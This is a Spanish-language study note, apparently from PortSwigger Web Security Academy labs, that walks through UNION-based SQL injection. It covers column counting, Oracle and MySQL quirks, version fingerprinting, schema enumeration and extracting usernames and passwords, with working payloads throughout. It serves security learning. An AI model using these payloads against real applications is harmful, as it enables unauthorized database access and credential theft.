-- de la url: https://0ae100fb038e70678185ca9600fd0074.web-security-academy.net/filter?category=Gifts
-- podemos asumir una query en el back, como sigue:
SELECT a, b FROM products WHERE category = 'Gifts'
-- podemos hacer -> https://0ae100fb038e70678185ca9600fd0074.web-security-academy.net/filter?category=Gifts' UNION SELECT c, d FROM users --
SELECT a, b FROM products WHERE category = 'Gifts' UNION SELECT c, d FROM users --'

-- en las consultas UNION, las consultas SELECT deben:
-- tener el mismo numero de columnas
-- tener el mismo tipo de dato en cada columna
-- para determinar el numero de columnas que tiene la primer consulta SELECT, podemos hacer
-- -> Gifts' ORDER BY 1 --
-- -> Gifts' ORDER BY 2 --
-- -> Gifts' ORDER BY n --
-- donde n sera la consulta que arroje error en el back.

-- CUIDADO!: mySQL requiere un espacio luego de las -- de los comentarios, por ello, hay que hacer:
-- -> Gifts' ORDER BY 1 -- '

-- o podemos hacer:
-- -> Gifts' UNION SELECT NULL--
-- -> Gifts' UNION SELECT NULL,NULL--
-- -> Gifts' UNION SELECT NULL,NULL,NULL--
-- -> buscando la consulta que NO arroje error

-- CUIDADO!: ORACLE requiere el FROM en cualquier consulta SELECT.
-- por suerte, existe una tabla dummy llamada DUAL, por lo que hay que hacer:
-- -> Gifts' UNION SELECT NULL FROM DUAL--

/*
Un ataque de inyección SQL mediante UNION te permite recuperar los resultados de una consulta inyectada.
Los datos interesantes que deseas recuperar normalmente están en forma de cadena de texto.
Esto significa que necesitas encontrar una o más columnas en los resultados de la consulta original cuyo tipo de dato sea,
o sea compatible con, datos de cadena.

Después de determinar el número de columnas requeridas, puedes probar cada columna para verificar si puede contener datos de cadena.
Puedes enviar una serie de cargas útiles de UNION SELECT que coloquen un valor de cadena en cada columna por turno.
Por ejemplo, si la consulta devuelve cuatro columnas, enviarías:

Gifts' UNION SELECT 'a',NULL,NULL,NULL--
Gifts' UNION SELECT NULL,'a',NULL,NULL--
Gifts' UNION SELECT NULL,NULL,'a',NULL--
Gifts' UNION SELECT NULL,NULL,NULL,'a'--

donde 'a' es una cadena de texto fija. inyectada en la query.

Si el tipo de dato de la columna no es compatible con datos de cadena, la consulta inyectada causará un error en la base de datos, como:

Conversion failed when converting the varchar value 'a' to data type int.

Si no ocurre un error y la respuesta de la aplicación contiene algún contenido adicional incluyendo el valor de cadena inyectado,
entonces la columna relevante es adecuada para recuperar datos de cadena.
*/

/*
Cuando has determinado el número de columnas devueltas por la consulta original y encontrado qué columnas pueden contener datos de cadena, estás en posición de recuperar datos interesantes.
Supongamos que:

La consulta original devuelve dos columnas, ambas capaces de contener datos de cadena.
El punto de inyección es una cadena entre comillas dentro de la cláusula WHERE.
La base de datos contiene una tabla llamada users con las columnas username y password.
En este ejemplo, puedes recuperar el contenido de la tabla users enviando la entrada:

Gifts' UNION SELECT username, password FROM users--

Para realizar este ataque, necesitas saber que existe una tabla llamada users con dos columnas llamadas username y password.
Sin esta información, tendrías que adivinar los nombres de las tablas y columnas.
Todas las bases de datos modernas proporcionan formas de examinar la estructura de la base de datos y determinar qué tablas y columnas contienen.
*/

/*
En algunos casos, la consulta en el ejemplo anterior puede devolver solo una columna.
Puedes recuperar múltiples valores juntos dentro de esta única columna concatenando los valores. Puedes incluir un separador para distinguir los valores combinados. Por ejemplo, en Oracle podrías enviar la entrada:

Gifts' UNION SELECT username || '~' || password FROM users--
Esto utiliza la secuencia de doble barra vertical ||, que es un operador de concatenación de cadenas en Oracle. La consulta inyectada concatena los valores de los campos username y password, separados por el carácter ~.

Los resultados de la consulta contienen todos los nombres de usuario y contraseñas, por ejemplo:

...
administrator~s3cure
wiener~peter
carlos~montoya
...
Diferentes bases de datos utilizan diferentes sintaxis para realizar la concatenación de cadenas.
*/

/*
Consultar el tipo y la versión de la base de datos
Puedes identificar potencialmente tanto el tipo de base de datos como la versión inyectando consultas específicas del proveedor para ver si alguna funciona.

A continuación se presentan algunas consultas para determinar la versión de la base de datos para algunos tipos populares de bases de datos:

Tipo de base de datos	Consulta
Microsoft, MySQL	SELECT @@version
Oracle	SELECT * FROM v$version
PostgreSQL	SELECT version()
Por ejemplo, podrías usar un ataque UNION con la siguiente entrada:

sql
' UNION SELECT @@version--
Esto podría devolver la siguiente salida. En este caso, puedes confirmar que la base de datos es Microsoft SQL Server y ver la versión utilizada:

Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
Mar 18 2018 09:11:49
Copyright (c) Microsoft Corporation
Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
*/

/*
Listar el contenido de la base de datos
La mayoría de los tipos de bases de datos (excepto Oracle) tienen un conjunto de vistas llamado el esquema de información.
Esto proporciona información sobre la base de datos.

Por ejemplo, puedes consultar information_schema.tables para listar las tablas en la base de datos:

sql
SELECT * FROM information_schema.tables
Esto devuelve un resultado como el siguiente:

TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
=====================================================
MyDatabase     dbo           Products    BASE TABLE
MyDatabase     dbo           Users       BASE TABLE
MyDatabase     dbo           Feedback    BASE TABLE

Este resultado indica que hay tres tablas, llamadas Products, Users y Feedback.

Ejemplo:

-- -> Gifts' UNION SELECT table_name, table_type FROM information_schema.tables -- '

o algo mejor filatrado:

-- -> Gifts' UNION SELECT table_name, table_type FROM information_schema.tables WHERE table_type = 'BASE TABLE' AND table_name NOT LIKE 'pg%' -- '



Luego puedes consultar information_schema.columns para listar las columnas en tablas individuales:

sql
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
Esto devuelve un resultado como el siguiente:

TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
=================================================================
MyDatabase     dbo           Users       UserId       int
MyDatabase     dbo           Users       Username     varchar
MyDatabase     dbo           Users       Password     varchar

Este resultado muestra las columnas en la tabla especificada y el tipo de datos de cada columna.

Ejemplo:
-- -> Gifts' UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'users_seclnv' -- '

y ahora si ya podemos ejecutar:

-- -> Gifts' UNION SELECT username_aevgsq, password_nzcptz FROM users_seclnv -- '

*/

